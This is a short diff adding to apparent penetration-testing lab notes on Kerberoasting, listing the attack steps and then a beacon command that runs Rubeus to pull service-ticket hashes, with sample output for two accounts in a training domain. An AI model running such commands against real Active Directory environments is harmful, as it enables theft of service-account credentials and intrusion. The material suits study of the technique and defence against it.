@@ -13,3 +13,16 @@
      5) The hacker attempts to crack the SPN value or service credential hash to obtain the service accounts' plaintext password using brute force tools like Hashcat or JohnTheRipper
      6) With the service account password in hand, the adversary attempts to log in to the service account and is granted access to any service, network or system associated with the compromised account
      7) The attacker is then able to steal data, escalate privileges or set backdoors on the network to ensure future access
+
+
+
+#Rubeus kerberoast
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
+
+[*] Action: Kerberoasting
+[*] Searching the current domain for Kerberoastable users
+[*] Total kerberoastable users: 2
+
+$krb5tgs$23$*svc_mssql$dev.cyberbotic.io$MSSQLSvc/srv-1.dev.cyberbotic.io:1433*$[...hash...]
+$krb5tgs$23$*svc_honey$dev.cyberbotic.io$HoneySvc/fake.dev.cyberbotic.io*$[...hash...]
+
